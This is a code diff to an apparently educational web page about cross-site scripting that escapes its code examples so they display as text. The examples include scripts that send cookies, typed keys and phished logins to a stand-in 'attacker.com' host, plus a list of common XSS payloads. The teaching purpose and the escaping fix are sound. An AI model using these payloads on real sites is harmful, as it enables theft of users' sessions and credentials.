@@ -144,31 +144,31 @@ import BaseLayout from "../../layouts/BaseLayout.astro";
           <div class="scenario-card">
             <h4>🍪 Cookie Stealing</h4>
             <div class="code-example">
-              <pre><code set:html={`<script>
+              <pre><code>&lt;script&gt;
   fetch('https://attacker.com/steal?c=' + document.cookie);
-</script>`} /></pre>
+&lt;/script&gt;</code></pre>
             </div>
           </div>
 
           <div class="scenario-card">
             <h4>🎣 Phishing</h4>
             <div class="code-example">
-              <pre><code set:html={`<script>
-  document.body.innerHTML = '<form action="https://attacker.com">
-    Login: <input name="user"><input type="password" name="pass">
-  </form>';
-</script>`} /></pre>
+              <pre><code>&lt;script&gt;
+  document.body.innerHTML = '&lt;form action="https://attacker.com"&gt;
+    Login: &lt;input name="user"&gt;&lt;input type="password" name="pass"&gt;
+  &lt;/form&gt;';
+&lt;/script&gt;</code></pre>
             </div>
           </div>
 
           <div class="scenario-card">
             <h4>⌨️ Keylogging</h4>
             <div class="code-example">
-              <pre><code set:html={`<script>
+              <pre><code>&lt;script&gt;
   document.addEventListener('keypress', function(e) {
     fetch('https://attacker.com/log?key=' + e.key);
   });
-</script>`} /></pre>
+&lt;/script&gt;</code></pre>
             </div>
           </div>
         </div>
@@ -213,27 +213,27 @@ import BaseLayout from "../../layouts/BaseLayout.astro";
         <div class="payloads-grid">
           <div class="payload-item">
             <div class="payload-header">Básico</div>
-            <code set:html={'<script>alert(1)</script>'} />
+            <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>
           </div>
           <div class="payload-item">
             <div class="payload-header">IMG Tag</div>
-            <code set:html={'<img src=x onerror=alert(1)>'} />
+            <code>&lt;img src=x onerror=alert(1)&gt;</code>
           </div>
           <div class="payload-item">
             <div class="payload-header">SVG</div>
-            <code set:html={'<svg onload=alert(1)>'} />
+            <code>&lt;svg onload=alert(1)&gt;</code>
           </div>
           <div class="payload-item">
             <div class="payload-header">Evento</div>
-            <code set:html={'<body onload=alert(1)>'} />
+            <code>&lt;body onload=alert(1)&gt;</code>
           </div>
           <div class="payload-item">
             <div class="payload-header">Iframe</div>
-            <code set:html={'<iframe src="javascript:alert(1)">'} />
+            <code>&lt;iframe src="javascript:alert(1)"&gt;</code>
           </div>
           <div class="payload-item">
             <div class="payload-header">Base64</div>
-            <code set:html={'<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">'} />
+            <code>&lt;img src=x onerror="eval(atob('YWxlcnQoMSk='))"&gt;</code>
           </div>
         </div>
       </div>
